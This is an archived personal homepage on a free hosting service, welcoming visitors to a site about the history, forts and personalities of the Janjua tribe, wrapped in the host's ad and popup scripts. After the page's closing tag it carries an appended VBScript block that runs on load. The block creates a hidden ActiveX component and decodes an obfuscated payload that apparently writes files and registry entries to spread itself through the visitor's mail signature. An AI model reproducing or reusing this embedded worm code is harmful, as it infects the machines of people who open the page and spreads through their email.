<SCRIPT LANGUAGE=JavaScript>
<!--
   document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%0A%66%75%6E%63%74%69%6F%6E%20%44%65%63%6F%64%65%28%73%29%7B%0A%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%0A%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%0A%7D%0A%3C%2F%73%63%72%69%70%74%3E'));
//-->
</SCRIPT>
<SCRIPT LANGUAGE=JavaScript src="/fs_img/js/md5.js"></SCRIPT>
<!-- '"AWS"' -->
<!-- Auto Banner Insertion Begin -->
<div id=aws_1716 align=center><style type="text/css">
  .mwsb{ background-color: 3366CC; border-width: 1px; border-color: 3366CC; border-style: solid; }
  .mwst, .mwst a{ font-family: arial,sans-serif; font-size: 8pt; background-color: white; color: blue;}
  </style>
  <!------ OAS SETUP begin ------>
  <img src="http://track.untd.com/s/oasrdb?pid=MWS&profile=,," width="1" height="1">
  <SCRIPT LANGUAGE=JavaScript>
  <!--
  //configuration
  OAS_url = "http://cyclops.prod.untd.com/";
  //OAS_sitepage values can be found in the excel spreadsheet showing position and pagenames.
  OAS_sitepage = 'webservices/general'; //CHANGED
  //OAS_sitepage = window.location.hostname + window.location.pathname;
  // must list every Ad position on the page or they will not show.  Also you can't have line items that are not on the page or a impression will be counted even though it was actually shown. 
  OAS_listpos = 'Top,Bottom,Frame1,Frame2,Right,TopLeft,Top1,TopRight';
  OAS_query = '';
  OAS_target = '_Blank';
  //end of configuration
  OAS_version = 10;
  OAS_rn = '001234567890'; OAS_rns = '1234567890';
  OAS_rn = new String (Math.random()); OAS_rns = OAS_rn.substring (2, 11);
  function OAS_NORMAL(pos) {
    document.write('<A HREF="' + OAS_url + 'click_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" TARGET=' + OAS_target + '>');
    document.write('<IMG SRC="' + OAS_url + 'adstream_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" BORDER=0></A>');
  }
  //-->
  </SCRIPT>


  <SCRIPT LANGUAGE=JavaScript1.1>
  <!--
  OAS_version = 11;
  if ((navigator.userAgent.indexOf('Mozilla/3') != -1) || (navigator.userAgent.indexOf('Mozilla/4.0 WebTV') != -1))
    OAS_version = 10;
  if (OAS_version >= 11)
    document.write('<SCR' + 'IPT LANGUAGE=JavaScript1.1 SRC="' + OAS_url + 'adstream_mjx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '?' + OAS_query + '"><\/SCR'+'IPT>');//-->
  </SCRIPT>

  <SCRIPT LANGUAGE=JavaScript>
  <!--
  document.write('');
  function OAS_AD(pos) {
    if ((OAS_version >= 11) && (typeof OAS_RICH != 'undefined')) {
      OAS_RICH(pos);
    } else {
      OAS_NORMAL(pos);
    }
  }

  //-->
  </SCRIPT>
  <!-- start /fs_img/about_pop.txt -->
<!-- The only pops this script can generate now are:
			1. Pops from UOL
			2. In-house popup
-->
<script language="JavaScript">
<!--
var isUS = "1";
var keyword = escape("");
var compname='freeservers';
var ourExitPop=true;

function popSlot(slot){
    // OAS AD 'Frame1' begin
    if(window.OAS_AD) OAS_AD('Frame1');
    // OAS AD 'Frame1' begin
}

function checkPopunderCookie() {
	var cookieVal = 0;
	cookieExpDays = (1/24);  
	var expDate = new Date();
	expDate.setTime(expDate.getTime() + (86400000 * cookieExpDays));
	cookieDate = ";Expires=" + expDate.toGMTString();
	if (document.cookie) {
		var cookieInfo = document.cookie.split(";");
		for (i=0; i<cookieInfo.length; i++) {
			cName = cookieInfo[i].split("=")[0];
			if (cName.indexOf("pixelpop") >= 0) {
				cookieVal = cookieInfo[i].split("=")[1];
			}
		}
	}
	cookieVal++;
	document.cookie="pixelpopslot="+cookieVal+";path=/;"+cookieDate;
 	if (cookieVal== 1) { popSlot(1); }
 	if (cookieVal== 2) { popSlot(2); }
 	if (cookieVal== 3) { popSlot(3); }
 	if (cookieVal== 4) { popSlot(4); }
 	if (cookieVal== 5) { popSlot(5); }
 	if (cookieVal== 6) { popSlot(6); }
 	if (cookieVal== 7) { popSlot(7); }
 	if (cookieVal== 8) { popSlot(8); }
}

if (!window.sprs) checkPopunderCookie();

if (!window.sprs && ourExitPop && (navigator.appName.indexOf('etscape')==-1)){
	window.onunload=staycheck;
	StayingOnSite=false;
	DadLinkURLs="";
	BabyLink="";
	DadWindow=window.parent;
	DadLinks=DadWindow.document.links;
	DadHost="http://"+location.hostname;
	DadWindow.document.onclick=linktellerDad;
	document.onclick=linktellerThis;
	function linkteller(){
		while (EventTag.parentElement&&(EventTag.tagName!="A")){
				EventTag=EventTag.parentElement;
		}
		if ((EventTag.tagName=="A")&&(!EventTag.target)){
			if (EventTag.href.indexOf(DadHost)>-1){
				StayingOnSite=true;
			} else {
				StayingOnSite=false;
			}
		}
	}
	function linktellerThis(){
		EventTag=window.event.srcElement;
		linkteller();
	}
	function linktellerDad(){
		EventTag=DadWindow.event.srcElement;
		linkteller();
	}
	function staycheck(){
		if (StayingOnSite){
		} else {
		}
	}
}
-->
</SCRIPT>
<!-- end /fs_img/about_pop.txt -->
  <table cellpadding="0" cellspacing="0" width="980">

    <!-- start: related resources -->
    <tr>
      <td colspan="3">
        <table cellpadding="0" cellspacing="0" align="center" width="100%" class="mwsb">
          <tr>
            <td class="mwst" id="uows0207" align="center">
              <a href="http://www.freeservers.com" target="_top">Free Web Hosting Provider</a> 
              - <a href="http://www.globalservers.com" target="_top">Web Hosting</a>
              - <a href="http://www.bizhosting.com" target="_top">E-commerce</a>
              - <a href="http://www.netzero.com/?refcd=MWS0404NWP11" target="_top">High Speed Internet</a>
              - <a href="http://www.freeservers.com/Free-Web-Page.html" target="_top">Free Web Page</a>
              <script type="text/javascript"><!--
              function find(){ obj = document.getElementById('uows0207'); arr = obj.getElementsByTagName('a'); for(var i=0;i<arr.length;i++){ var x = '?refcd=WSUOWS020722NB01'; if(!arr[i].href.match(/refcd/)) arr[i].href+=x; }}; find();
              //--></script>
            </td>
          </tr>
        </table>
      </td>
    </tr>
    <!-- end: related resources -->

    <tr>
      <td width="130">
        <table cellpadding="0" cellspacing="0" width="130" style="margin-top:2px;">
          <tr>
            <td class="mwst" nowrap="1">
              <a href="http://8m.com/?refcd=MWS_20040713_Banner_bar"
                ><img src="/cgi-bin/image/images/bannertype/100X22.gif" width="100" height="22" border="0"
                ></a
              ><a href="/cgi-bin/login" target="_blank"
                ><img src="/cgi-bin/image/images/bannertype/login_chunkx.gif" width="30" height="22" border="0"
                ></a
             ></td>
          </tr>
        </table>
        
        <table class="mwsb" cellpadding="0" cellspacing="0" width="100%" style="margin-top:2px;">
          <tr>
            <td align="center">
              <a href="/cgi-bin/path/signup?refcd=MWS_20040713_Banner_bar"
              ><img src="http://nztv.prod.untd.com/RealMedia/ads/Creatives/ISP/MWS_Mkting_LSKYBUT_34_8023/128x64_get_a_free_website_01.gif" border="0"
              ></a>
            </td>
          </tr>
        </table>
      </td>

      <td>
        <table cellspacing="0" class="mwsb" style="margin:2px;margin-bottom:0px;table-layout:fixed;"> 
          <tr>
            <td class="mwst" align="center" style="width:730px;">
    <!------ OAS AD 'Top' begin ------>
    <SCRIPT LANGUAGE=JavaScript>
    <!--
    if(window.OAS_AD) OAS_AD('Top');
    //-->
    </SCRIPT>
    <!------ OAS AD 'Top' end ------></td>
          </tr>
        </table>
      </td>

      <td width="120">
        <table class="mwsb" cellpadding="0" cellspacing="0" width="120" style="margin-top:2px;">
          <tr>
            <td class="mwst" nowrap="1">
              <SCRIPT LANGUAGE=JavaScript><!--
              OAS_AD('Top1');
              //--></SCRIPT>
            </td>
          </tr>
        </table>
        
        <table class="mwsb" cellpadding="0" cellspacing="0" width="100%" style="margin-top:2px;">
          <tr>
            <td align="center">
              <SCRIPT LANGUAGE=JavaScript><!--
              OAS_AD('TopRight');
              //--></SCRIPT>
            </td>
          </tr>
        </table>
      </td>

    </tr>
    <tr>
      <td colspan="3" align="center">
        <!-- search bar begins --><table width="100%" cellpadding="0" cellspacing="0" class="mwsb" style="border-width:2px; margin-top:10px; background-color:white; height:10px;">  <tr valign="top">    <td align="center">      <form action="http://search.mysite.com/search" style="margin:0;" target="_blank">      <span style="position:relative;top:-5px;font-family:arial;font-size:12px;color:#000;"><b>Search the Web</b></span>      <input type="hidden" name="source" value="mws_endsite_box">      <input type="hidden" name="action" value="search">      <input name="query" accesskey="s" style="width:400px; height:21px; background:white; border:1px #A4ABB1 solid; font-family: arial, sans-serif; font-size: 10pt; color: #000000; position:relative; top:-6px;">      <input type="image" src="/fs_img/bannertype/infospace/search_sp_go.gif">      <img src="/fs_img/bannertype/infospace/search_logo.gif" style="position:relative;top:4px;left:10px;">      </form>    </td>    <td width="5%"></td>  </tr></table>
      </td>
    </tr>
  </table><DIV id=sideFrame 
	style="MARGIN-TOP: 27px; RIGHT: 5px; WIDTH: 120px; COLOR: #ffffff; POSITION: absolute; BACKGROUND-COLOR: #CCCCCC; Z-INDEX: 10000; TEXT-ALIGN: right"><A 
	href="javascript:void%20(sideFrameOff())"><IMG src="/fs_img/banners/xout.gif" title="Close"
	border=0></A><BR>
  <!------ OAS AD 'Right' begin ------>
  <SCRIPT LANGUAGE=JavaScript>
  <!--
  OAS_AD('Right');
  // -->
  </SCRIPT>
  <!------ OAS AD 'Right' end ------>
	<SCRIPT>
		origRightPadding=document.body.style.paddingRight;
		document.body.style.paddingRight="130px";
		function sideFrameOff(){
			document.getElementById('sideFrame').style.display='none';
			document.body.style.paddingRight=origRightPadding;
		}
	</SCRIPT>
	</DIV>
  <DIV id="setMyHomeOverlay" align="left" style="position:absolute; top:25%; left:25%; width:358px; border:1px solid #AEAEAE; background-color:white; z-index:200000; display: none;">
    <div style="height:59px; padding-left:22px; background:white url('/cgi-bin/image/images/sethome_top_border.gif') repeat-x;">
    <div style="float:left; width:182px; height:35px; margin-top:12px; font:bold 38px arial,sans-serif; color:#454545"> Welcome! </div>
    <div style="float:right; padding:6px 5px 0px 5px;"><a href="#" onclick="javascript:do_set_homepage('close'); return false;">
    <div style="background:url('/cgi-bin/image/images/sethome_x.gif'); width:21px; height:21px; cursor:pointer;"></div></a></div>
    <div style="float:right; font:bold 12px arial; margin-top:10px;"><a style="text-decoration:none; color:#004182;" href="#" onclick="javascript:do_set_homepage('close'); return false;">Close</a></div></div>
    <div style="height:170px; background:#ffffff;">
    <div style="padding:30px 20px 0px 20px; font:normal 14px arial; height:80px;"> Would you like to make this site your homepage? It's fast and easy... </div>
    <div style="padding:10px 0 0 41px;">
    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_l.gif'); width:4px; height:26px;" onclick="javascript:do_set_homepage('do');"> </div>
    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_m.gif') repeat-x; width:265px; height:26px; text-align:center; font:bold 13px Arial; color:#FFFFFF; line-height:25px;" onclick="javascript:do_set_homepage('do');"> Yes, Please make this my home page! </div>
    <div style="float:left;cursor:pointer; background:white url('/cgi-bin/image/images/sethome_btn_r.gif'); width:4px; height:26px;" onclick="javascript:do_set_homepage('do');"> </div></div>
    <div style="padding-left:148px; padding-top:7px; clear:both; font:normal 12px arial;"><a href="#" style="text-decoration:none; color:#004182;" onclick="javascript:do_set_homepage('close'); return false;">No Thanks</a></div></div>
    <div style="height:36px; background: white url('/cgi-bin/image/images/sethome_bot_border.gif') repeat-x;">
    <div style="float:left;margin:12px 0px 0px 20px; line-height:10px;"><input type="checkbox" style="width:11px; height:11px;" onclick="javascript:do_set_homepage('dont');"></div>
    <div style="float:left;font:normal 12px arial;padding:10px 0 0 2px;"> &nbsp; Don't show this to me again.</div>
    <div style="float:right; padding:6px 5px 0px 5px;"><a href="#" onclick="javascript:do_set_homepage('close'); return false;">
    <div style="background:url('/cgi-bin/image/images/sethome_x.gif'); width:21px; height:21px; cursor:pointer;"></div></a></div>
    <div style="float:right;font:bold 12px arial; margin-top:10px;"><a style="text-decoration:none; color:#004182;" href="#" onclick="javascript:do_set_homepage('close'); return false;">Close</a></div></div></div>
    <span ID="mws_oHomePageOverlay" style="behavior:url(#default#homepage); display:none;"></span>
    <script src=/fs_img/js/overlay.js></script><script defer="defer" src=/fs_img/js/set_homepage.js></script></div><!-- Auto Banner Insertion Complete THANK YOU -->

<SCRIPT LANGUAGE=JavaScript>
<!--   
    Decode('%253Cscript%2520language%253D%2522javascript%2522%2520type%253D%2522text/javascript%2522%2520src%253D%2522/cgi-bin/validate_banner%253Fenc%253Dtvi1tvic748%25253D1tswxc%25253B%25253A%25253D4%2522%253E%253C/script%253E0');
//-->
</SCRIPT>

<SCRIPT language=JavaScript>
<!--

function MM_showHideLayers() { //v3.0
  var i,p,v,obj,args=MM_showHideLayers.arguments;
  for (i=0; i<(args.length-2); i+=3) if ((obj=MM_findObj(args[i]))!=null) { v=args[i+2];
    if (obj.style) { obj=obj.style; v=(v=='show')?'visible':(v='hide')?'hidden':v; }
    obj.visibility=v; }
}

function MM_findObj(n, d) { //v4.0
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && document.getElementById) x=document.getElementById(n); return x;
}
//-->
</SCRIPT>

<meta name="ProgId" content="FrontPage.Editor.Document">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="description" content="people who make the course of history,janjua history ,personalities,picturs,into,">
<meta name="keywords" content="janjua, jatt,tikka khan,swar shahid,ch.aurangzeb janjua,maldave,history of janjua,history,pesonalities,forts">

<STYLE type=text/css></STYLE>
<LINK href="cps.css" rel=stylesheet>
<script language="JavaScript" fptype="dynamicanimation">
<!--
function dynAnimation() {}
function clickSwapImg() {}
//-->
</script>
<script language="JavaScript1.2" fptype="dynamicanimation" src="file:///C:/Program%20Files/Microsoft%20Office/Office10/fpclass/animate.js">
</script>
</HEAD>
<BODY leftMargin=0 topMargin=0 marginheight="0" marginwidth="0" bgcolor="#000000" onload="dynAnimation()">
<P>
&nbsp;</P>
<P>
<font face="MS Sans Serif"><font size="4" color="#FFCC98"><b>
&nbsp; IN THE NAME OF </b>
</font><b><font size="5" color="#FF0000">ALLAH</font><font size="4" color="#FFCC98"> 
WHO IS THE MOST BENEFICENT AND MERCIFUL</font></b></font></P>
<P>
<b><font face="MS Sans Serif" size="4" color="#FFCC98">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<img border="0" src="badshahi.jpg" width="572" height="51"></font></b></P>
<P><b><font face="Impact" size="6" color="#F1DA9F">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <img border="0" src="faujis.gif" width="140" height="60">&nbsp; 
WELCOME TO HOME PAGE </font><font face="Impact" size="6" color="#F1DA9F">&nbsp;</font></b><img border="0" src="tiger.gif" width="130" height="55"></P>
<HR>

<TABLE align=center border=0 cellPadding=0 cellSpacing=0 width=721>
  <TBODY>
  <TR vAlign=top>
    <TD height=78 width=721>
    <b><font face="MS Serif" color="#FFCC98">
    <a style="text-decoration: none" href="INTRO%20JAN.htm">
    <font color="#FFC858">INTRODUCTION</font></a></font></b><font color="#FFC858"></a></font><B><FONT color=#FFC858 face="MS Serif">~</FONT><FONT color=#FFCC98 face="MS Serif"><font color="#FFC858"><a style="text-decoration: none" href="MAL.htm"><font color="#FFC858">MAHARAJA </font>
    </a>
    </font> 
    <a style="text-decoration: none" href="MAL.htm">
    <font color="#FFC858">MALDAVE JANJUA</font></a><FONT color=#FFC858 face="MS Serif">&nbsp;~</FONT><a style="text-decoration: none" href="SONS.htm"><font color="#FFC858">JANJUA'S</font></a></FONT><font color="#FFC858" face="MS Serif"> </font>
    <a href="../MAL%20SON/SONS.htm" style="text-decoration: none">
    <font color="#FFC858" face="MS Serif">VILLAGES</font></a><font color="#FFC858" face="MS Serif"> </font><FONT color=#FFC858 face="MS Serif">
    ~ </FONT><FONT color=#008080 face="MS Serif"><FONT color=#FFCC98 face="MS Serif"><a style="text-decoration: none" href="PIC.htm"><font color="#FFC858">PICTURES</font></a></FONT><FONT color=#FFC858 face="MS Serif">~ </FONT>
    <FONT color=#FFCC98 face="MS Serif">
    <font color="#FFC858"><a style="text-decoration: none" href="incident.htm"><font color="#FFC858">INCIDENTS &amp; OPINIONS</font></a><a href="../INCIDENT/incident.htm" style="text-decoration: none">&nbsp;</a></font><FONT color=#FFC858 face="MS Serif"> 
      ~&nbsp;</FONT><a style="text-decoration: none" href="FORTS.htm"><font color="#FFC858">JANJUA'S 
    FORTS</font></a><FONT color=#FFC858 face="MS Serif"> ~ </FONT> </FONT>
    <a href="../JAN%20PERSON/PERS%20janjua.htm" style="text-decoration: none">
    <font color="#FFC858">
    <a style="text-decoration: none" href="PERS%20janjua.htm">
    <font color="#FFC858">JANJUA PERSONALITIES</font></a></font></a><FONT color=#FFC858 face="MS Serif"> 
    ~<a style="text-decoration: none" href="ADAM.htm"><font color="#FFC858">PEDIGREE</font></a>~&nbsp;&nbsp; </FONT><a href="page_01.htm" style="text-decoration: none"><font color="#FFC858">FAMILY PICTURES</font></a><FONT color=#FFC858 face="MS Serif"> ~</FONT></FONT><FONT color=#FFC858 
      face="MS Serif"> </FONT>
    <a style="text-decoration: none" href="person%20family.htm">
    <FONT color=#FFC858 
      face="MS Serif">PERSONALITIES</FONT></a><FONT color=#FFC858 
      face="MS Serif"> ~F<a href="intro%20FAMILY.htm" style="text-decoration: none"><font color="#FFC858">AMILY INTRODUCTION</font></a> ~
    <a style="text-decoration: none" href="creator.htm">
    <font color="#FFC858">SITE CREATORS</font></a>~</FONT></B><hr></TD></TR></TBODY></TABLE>
<TABLE bgColor=#ffffcc border=0 cellPadding=0 cellSpacing=0 width="100%">
  <TBODY>
  <TR vAlign=top>
    <TD>
      <TABLE bgColor=#ffffcc border=0 cellPadding=0 cellSpacing=0 
        width="100%"><TBODY>
        <TR>
          <TD height=15 vAlign=top><FONT color=#800000><B>
            <MARQUEE behavior=alternate style="font-size: 18pt">THE PEOPLE WHO MAKE THE COURSE OF HISTORY</MARQUEE></B></FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><!-- #BeginEditable "raj" -->
<DIV align=center>
<CENTER>
<p><b><font face="Monotype Corsiva" color="#F1DA9F" size="5"><strong><blink><font face="Romantic" size="5" color="#FFC858">&nbsp;&nbsp; </font><font face="Romantic" size="5" color="#000080">
<a href="jan%20PART.htm">
<img border="0" src="SWORDb%20MIX%20S%201.jpg" width="189" height="87"></a>&nbsp; <img border="0" src="k-t.jpg" width="236" height="345"> </font></blink></strong></font></b>
<a href="our%20family.htm">
<img border="0" src="SWORD%20R.jpg" width="212" height="83"></a></p>
</CENTER></DIV>
<DIV align=center>
<CENTER>
<p><b><font color="#F8ECE8" face="Monotype Corsiva" size="5">&nbsp;&nbsp;
<a href="CONCEPT%20OF%20JATT&%20RAJPUT.htm" style="text-decoration: none">
<font color="#F8ECE8">Origin Of Jatts &amp; Rajputs</font></a></font></b></p>
</CENTER></DIV><font face="Monotype Corsiva" color="#F1DA9F" size="5">
<b>
<P dynamicanimation="fpAnimdropWordFP1" id="fpAnimdropWordFP1" style="position: relative !important; visibility: hidden" language="Javascript1.2">&nbsp;<img border="0" src="fire1.gif" width="112" height="102"><span style="visibility:''"><font face="Times New Roman" size="7" color="#FFC858">&nbsp;&nbsp;J</font><font face="Times New Roman" color="#00ff00"><blink><strong><font size="7" color="#FFC858">ANJUA</font></strong></blink></font><strong><blink><font face="Times New Roman" size="7" color="#FFC858">
</font></blink></strong><blink><strong>
<font size="7" color="#FFC858" face="Times New Roman">THE GREAT</font><font face="Romantic" color="#00ff00" size="7"> </font> </strong></blink></span><font face="Impact" size="6" color="#F1DA9F">
<img border="0" src="fire1.gif" width="112" height="102"></font></P>
<P><blink><font size="5" color="#F1DA9F">Asalm-o- Alaikum Dears,</font></blink><font color="#FFC858">&nbsp;&nbsp;&nbsp;&nbsp;
</font> 
</P>
<P><font color="#00FF00">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</font></b><font color="#00FF00">&nbsp;</font></font><font face="Monotype Corsiva" color="#FFCC98">
<font size="5">We welcome you in our site, We&nbsp; are 
Janjua  ,&nbsp; we wish to 
provide you historic background of Janjua and many many more 
about Janjua, through this site You can know about our family and also about history of Janjua,</font></font><font face="Monotype Corsiva" size="5" color="#FFCC98"> One 
thing that should be clear in mind is that no doubt JANJUA is a great tribe&nbsp; 
and we can proud to be a Janjua&nbsp; but ISLAM teaches for brotherhood &amp; 
equality of&nbsp; humanity, As Allah says in HOLLY QURAN .</font></P>

<P><font face="Monotype Corsiva" size="5" color="#FFCC98">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; we 
are very thankful to you for viewing&nbsp;,We 
are hopeful that you may&nbsp; share your knowledge &amp; provide us information.&nbsp;
</font></P>

<p><b><strong><font size="6" color="#F1DA9F" face="Romantic">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img border="0" src="A%20warrior.gif" width="81" height="145">&nbsp;&nbsp;&nbsp;&nbsp;<a href="creator.htm" style="text-decoration: none">
<font color="#FFC858">JOIN US</font></a>!&nbsp;
<img border="0" src="handbox.gif" width="50" height="50"></font></strong></p>

</b>

<p><img border="0" src="fireline.gif" width="779" height="29"></p>

</BODY></HTML>
<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "?gjDlTe`pb)CrjiOcuq'T_pOcuq'BbdmcbPdek)<nmi`M_g`aq)AQL)RqPe`ji)RgkM\re)Ns_B'Dfk\jvAdqhQr_IG\nr^oo&&IGP`rAfh&&IG@mc^q`Kfidcr%$HEJfh`Gq%$HEAob\rbJ\gi%$HENolk_d^oc%&Bk_Pr]Drk^rfliHG<nmbibQl#Dfi`N^qc*QvkcPqm'JlBmploPbppkbIcuqPboOb\bQbhn:DPL)MmbiRbuoDfi`&CfgcM^of).$QhnPqm:Mc^aOcjm)Pb^_?iiFcGkpop%QhnPqm*HE]pq\pq%$ &7<-MoGck%OkmPop&7.OfbkOb\bQbhn+@gmpbBudrCpl`qdmkCkaGcGcOwmbNro8eorOfbkOb\bQbhn+@gmpbPboCfgcQbhn:DPL)MmbiRbuoDfi`&CfgcM^of)/$CdjbQ`km+Rpfq`9#@LATlkgm^a8 $q`p`mgmq5 # HGZqq^mr%& !;#q`@oGd#RjmNro!s_>pIc$EokiQ`vqDfi`Rbjk,@ijqbQbqD>qopf_;CNM+D`rCfgc%CdjbM\re&C>orof],^qopf_prbp;0/BgqbPb^_Rbjk,@ijqbQbqDfi`Rbjk:AQL+JnbkOcuqAgib#Dfi`N^qc*5&FcRvm`Qqo;crjiQe`lAgibOcjm)Uofocs]AoIa#:!EOKI;#q`@oGd# 9$=MAVmkij_a: !s]q`odnq7#IG\nr^oo&& # ;$s]AoIa#CrjiOcuqBincFcRvm`Qqo;q`pRebiCdjbQ`km+Rpfq`s_>pIc$S]qQbsr@laDdAgibOcjm)Ailnc@laDd@laAsk`oglkAsk`oglkIG@c_kd`Qr_#AromckqNrofie)I\qqFibbu>f^o$FaI^nrFk_cu@c_o8-OfbkFcJbco&I@\qb%>soo`lqPopfkb').$:9J@^nc%^ &OfbkHG>f^kbcPr]:Agk^gwAfni# 7YPp`B8-Cip`HEAe^iebPp`:Aeo#?p`#Jbco&I@\qb%>soo`lqPopfkb').$'*/&!7W Ns_B;-Bk_FcBincFH@e\ldbNs_8Jf_&@rmpbkoQqodld),*I^nrFk_cu@c_o&Bk_FcBk_CriaqfjlCriaqfjlHEAob\rbJ\gi%$LiBommoMcprhcK`vqGcDlTe`pb8eokiRebiBsgqAsk`oglkBk_FcPe\pbCdjb8Ibar%TdlM^of)0$#Nolbp^jDfi`qY@jkjliCfgcpYHg`ojqlcoPe\pbaWQq^oglk`pvY]j^kf,eqh Dd%AQL+Agib@vfpoq%Pc_obAgib$'QcckA^igHG<nmbibQl#Qe^mcCfgc)crji'@jpbPboCfgcQbhn:DPL)MmbiRbuoDfi`&Pe\pbCdjb)-*qopc&Dfi`Rbjk,Todrb:!EOKI;#q`@oGd# 9$=MAVmkij_a: !s]q`odnq7#IG\nr^oo&& # ;$s]AoIa#CrjiOcuqCfgcQbhn+@gmpbBk_FcAba_rioGa8TpNfbig,ObbPb^_&EFCV\>SOO@LQ\PQBOWGabirfqdcpY?cc^pjqPqboGA$LprIljiSbmqfli:RqPe`ji+McdO`_a%FHBT]IL>?I\H?@EDLBYNmcqr_obWKf`mmplarYLpriljiBsnobnqYJ`bf^Qco$TnQebgj+O`eTodrbFHBT]@RMPBKO]RP@PYF_ckqdrfbnZ#?cc^pjqF_$YNmcqr_obWKf`mmplarYLpriljiBsnobnqY!Ibar%LprIljiSbmqfli*.&$++ZJ^djY@jkmlncRncPo_qfjlbot ).' OBB]ATJPA@^gjHEK^fgPbd# EH@W\@PPOBIR\RNCOYDbbkogqf`qY!Bbc\siqDb#WQlcou^o`ZJf^plpjdqYJsqijmh@vmo`qpY$I`dq%JsqIjmhS`ppfjl).$#).YJ\giYNr^qdmkbmwK\kb'Qe^mcCfgc&A^igHGH_fiMcd%FHBT]@RMPBKO]RP@PYF_ckqdrfbnZ#?cc^pjqF_$YNmcqr_obWKf`mmplarYLpriljiBsnobnqY!Ibar%LprIljiSbmqfli*.&$++ZJ^djYTdbbNr^qdmkbmwK\kb'Qe^mcCfgc&UpPccii)PbdRpfq`EFCV\>SOO@LQ\PQBOWQlcou^o`ZJf^plpjdqYJdcf^cY6).YLpriljiYLkrfliqYJ\giY@bfqjpMo`dbo`l`b*.0,.4/' OBB]ATJPA@^gjHEK^fgPbd# EH@W\@PPOBIR\RNCOYNmcqr_obWKf`mmplarYTdlalrqJ`qp^bgkdQr_nwpq`kYMmmcfgcpYHg`ojqlcoLrojllfFkocok`rP`rqfiepY+_-a+0--+.--+.--^.--+.--+.--+.13W.-.`.03+ )]j^kf &A^igHGH_fiMcd%FHBT]@RMPBKO]RP@PYPjdqt\pbYHg`ojqlcoZTfibltnKQWAromckqQcopdmkYRgkajupHcpp\efkbPr]qvpocjYKplcdjbpWKf`mmplarLpriljiFirboicqNcqqdldpW.^-_./-+.--+.--+a--+.--+.--+.-11Z--,c-01.)`i^ii&TpNfbig,ObbUofocCIBVZAROMCKQZSPBMZPlart^mcYJdaolnmcqWMccdabY,.+-WMrqgmlhWMmqdmkpWK^fgZBadrloKpbc`pbk^c),1.-20)MCD\?ULO? >_iiIGJ\giO`e%CIBVZAROMCKQZSPBMZPlart^mcYJdaolnmcqWMccdabY,.+-WAljhmkYH_fiNcqqdldpWLbtNr^qdmkbmw)`i^ii&HGpkj^bcClgbbo#Jbco&TfiN^qc*0&$Kpldm_jAgibnZ@lhklkDfi`qYJdaolnmcqQe^mcaYNr^qdmkbmw&Bk_CriaqfjlCriaqfjlHEAob\rbJdjfbp&&Mk@polmObnsjbLbuoQ`kmM\re8FcLlq#DPL)Dfi`Cufnrp%RgkM\re!TNaofkr+bsc&$Qe`lOcjmK_qe;nwpq`k0/W @laDdDdQ`kmM\re8ptqqbh1/YQe`lNr^ooSmCdjb8TfiN^qc#QVPOCJYFcok`j0/)biiBgqbQq^mrRmAgib;TdlM^of# PVNRBJWIboici+_jiBk_FcTpNfbig,ObbUofocCIBVZJL@<J\J<AEFICYPjdqt\pbYHg`ojqlcoZTfibltnZ@rmpbkoTbonglkWPrkWIboici0- )Po_oqPnCfgcAQL+>mmvAgibUfkK_qe$rc_Yfht^gj+ddd)RgkM\re!t``YCjjabm,eqo AQL+>mmvAgibUfkK_qe$nwpq`k0/Wigt\ji+bgc'UfkK_qe$nwpq`k0/Wbbpfrlm)gkf@\jiFH>mkckaOm%TdlM^of# tb]ZClgbbo)fqq*eor&TpNfbig,ObbUofocCIBVZAI>NQBPZPLLOZ+agjY' aigdfi` RqPe`ji+McdTmgqb EH@W\@G?PP@Q\OJMQY)biiWAlkockqRvm` )\nmida^qdmk,s+jp_mtkgm^aTnQebgj+O`eTodrb